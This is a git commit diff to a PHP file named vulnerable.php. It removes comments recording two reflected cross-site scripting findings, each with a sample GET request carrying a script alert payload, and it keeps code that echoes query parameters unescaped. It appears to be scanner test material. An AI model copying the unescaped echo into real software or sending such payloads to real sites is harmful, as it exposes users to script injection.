1abea1630aa2857252b64a855bd3ee0df97238c5
userwithrepo <bugiz300@yandex.com>
2015-04-14 10:47:10 +0300

    Update vulnerable.php

--- vulnerable.php
+++ vulnerable.php
@@ -1,15 +1,3 @@
 <?php
-//TODO: AI XSS issue #187, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/187, 4418e781
-//AI exploit:
-//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-843caa4/vulnerable.php?id2=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
-//Host: localhost
-//Accept-Encoding: identity
-//Connection: close
-//TODO: AI XSS issue #187, Medium, Cross-site Scripting, https://github.com/userwithrepo/ACSI_S4/issues/187, f9b7bde6
-//AI exploit:
-//GET /../../../../../../PHP_Repos/userwithrepo.ACSI_S4/userwithrepo-ACSI_S4-843caa4/vulnerable.php?id1=%3Cscript%3Ealert%281%29%3C%2Fscript%3E HTTP/1.1
-//Host: localhost
-//Accept-Encoding: identity
-//Connection: close
 echo $_GET['id1']." ".$_GET['id2'];
 ?>
